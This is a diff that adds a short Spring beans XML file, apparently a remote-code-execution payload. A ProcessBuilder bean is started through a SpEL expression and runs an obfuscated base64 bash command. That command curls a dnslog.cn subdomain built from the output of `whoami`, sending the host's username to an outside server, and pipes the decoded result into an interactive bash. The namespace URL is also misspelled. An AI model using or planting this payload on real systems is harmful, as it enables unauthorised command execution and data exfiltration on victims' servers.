@@ -1,0 +1,8 @@
+<beans xmlns="http://www.sprinqframework.org/schema/beans"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:schemaLocation="http://www.sprinqframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+<bean id="pb" class="java.lang.ProcessBuilder">
+<constructor-arg value="bash -c {echo,Y3VybCBgd2hvYW1pYC45aHZmNmEuZG5zbG9nLmNu}|{base64,-d}|{bash,-i}" />
+<property name="whatever" value="#{ pb.start()}"/>
+</bean>
+</beans>
